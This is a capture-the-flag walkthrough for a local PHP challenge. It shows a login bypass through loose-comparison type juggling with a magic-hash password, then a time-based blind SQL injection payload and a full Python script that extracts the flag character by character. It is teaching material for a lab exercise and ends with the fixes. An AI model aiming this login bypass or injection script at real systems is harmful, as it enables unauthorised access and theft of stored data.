### Walkthrough

This challenge revolves around exploiting two main vulnerabilities: **PHP type juggling** to bypass the login and **time-based blind SQL injection** to extract the flag from the database.

The challenge files are located in the **`src/`** directory, which contains the source code, including the `login.php` and `admin.php` files that are vulnerable to these attacks. 

Let’s break the challenge into two parts:

1. **Bypass the login** using a known PHP type juggling vulnerability.
2. **Extract the flag** using time-based blind SQL injection.

---

### Part 1: Bypass Login (PHP Type Juggling)

The login page in this challenge is vulnerable to **PHP type juggling**, a vulnerability that arises when loose comparison (`==`) is used to compare a hashed password with the user input's `SHA256` hash.
The login page also has rate-limiting protections in place to ensure that the user doesn't solve the challenge through bruteforcing but rather uses the type juggling approach. 

#### Vulnerable Code (from `login.php`):

```php
if ($stored_hash == hash("sha256", $password)) {
    // Authentication successful
    $_SESSION['username'] = $username;
    header("Location: admin.php");
    exit();
} else {
    echo "Invalid password.";
}
```

**Type juggling** occurs because `==` allows PHP to interpret strings that start with `0e` followed by digits as **scientific notation** (0 times 10 to the power of something, which equals 0). If both hashes start with `0e` and are followed by digits, PHP considers them equal, even though they are not.

**Goal**: Find a string that, when hashed with `SHA256()`, results in a value that PHP interprets as zero when compared loosely.

### Solution

A well-known string that causes this behavior is `"TyNOQHUS"`. The SHA256 hash of this string is:

```bash
$ sha256sum <<< "TyNOQHUS"
0e66298694359207596086558843543959518835691168370379069085300385
```

In this case, the SHA256 hash is a string starting with `0e`, followed by digits, which triggers the type juggling vulnerability.

#### Steps:

1. **Go to** `http://localhost:8080/login.php`.
2. **Enter**:
   - **Username**: `admin`
   - **Password**: `TyNOQHUS`
3. You will be successfully logged in and redirected to `admin.php` because the loose comparison in the login check (`==`) allows the input password to match the stored hash due to type juggling.

---

### Part 2: Extract Flag (Time-Based Blind SQL Injection)

Once you’re logged in, you need to extract the flag from the database. The `admin.php` page has a **SQL injection** vulnerability in the `user_id` parameter, which allows for **time-based blind SQL injection**.

#### Vulnerable Code (from `admin.php`):

```php
$sql = "SELECT * FROM users WHERE id = $user_id";
```

The `user_id` parameter is directly included in the SQL query without any sanitization, making it vulnerable to SQL injection.

### Solution

To extract the flag, we can use **time-based blind SQL injection**. This approach works by causing a delay (using the `SLEEP()` function in SQL) when certain conditions are true, allowing us to extract data one character at a time based on the response time.

#### Example Query:
```sql
1 AND IF(SUBSTRING((SELECT flag FROM flags WHERE id=1), 1, 1) = 'C', SLEEP(5), 0)
```

This query checks if the first character of the flag is `'C'`. If it is, the query causes a 5-second delay.

### Automating the Extraction

Here’s the Python script to automate the login bypass and SQL injection process to extract the flag:

```python
import requests
import time

# Base URL of the CTF challenge
base_url = "http://localhost:8080"

# 1. Login bypass using PHP Type Juggling vulnerability
login_url = f"{base_url}/login.php"

# Credentials
username = "admin"
password = "TyNOQHUS"  # This password produces a suitable SHA256 hash for type juggling

# Login POST data
login_data = {
    "username": username,
    "password": password
}

# Start a session to maintain cookies (important for authenticated requests)
session = requests.Session()

# Send login request
login_response = session.post(login_url, data=login_data)

# Check if login was successful (by checking redirection or response content)
if "admin.php" in login_response.url:
    print("[+] Login successful, type juggling exploit worked!")
else:
    print("[-] Login failed, type juggling exploit did not work.")
    exit()

# 2. Time-based Blind SQL Injection to retrieve the flag
admin_url = f"{base_url}/admin.php"

# We're going to use the SQL injection in the user_id parameter to retrieve the flag
# Assumption: the flag is in a table `flags`, in a column `flag`.

flag = ""
flag_length = 30  # Assume the flag length is 30 characters

# Characters to test
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'

print("[+] Starting Time-Based Blind SQL Injection to extract the flag...")

for position in range(1, flag_length + 1):
    for char in characters:
        # Payload to inject in the user_id parameter
        payload = f"1 AND IF(SUBSTRING((SELECT flag FROM flags WHERE id=1), {position}, 1) = '{char}', SLEEP(5), 0)"
        
        # Record the time before making the request
        start_time = time.time()
        
        # Send request with the SQL injection payload
        injection_response = session.get(admin_url, params={'user_id': payload})
        
        # Record the response time
        response_time = time.time() - start_time
        
        # If the response time is greater than 5 seconds, we found the correct character
        if response_time > 5:
            flag += char
            print(f"[+] Found character {char} at position {position} | Flag so far: {flag}")
            break

# Output the final flag
print(f"[+] Flag retrieved: {flag}")
```

### Explanation of the Script:

1. **Login Bypass**: The script first sends a POST request to `login.php` with the username `admin` and password `TyNOQHUS` to exploit the type juggling vulnerability.
2. **SQL Injection to Extract the Flag**:
   - It then sends GET requests to `admin.php` with the `user_id` parameter set to an SQL injection payload.
   - The payload uses the `SLEEP()` function to check if each character of the flag matches the guessed character.
   - If the response time is greater than 5 seconds, it confirms the correct character.
   - The script iterates through all positions and characters to retrieve the flag.

---

### Conclusion

This challenge introduces participants to two common vulnerabilities:

1. **PHP Type Juggling**: Used to bypass authentication by exploiting weak comparisons in password validation.
2. **Time-Based Blind SQL Injection**: Used to extract sensitive data (the flag) from the database by timing SQL queries.

By walking through this challenge, participants learn how to detect and exploit such vulnerabilities and also understand the importance of using **strict comparisons** (`===`) and **prepared statements** to prevent these types of attacks.

> **Note**: The source code for the challenge is located in the `src/` directory. Reviewing the source code can provide valuable insights into how the vulnerabilities are exploited and help improve your understanding of web security.
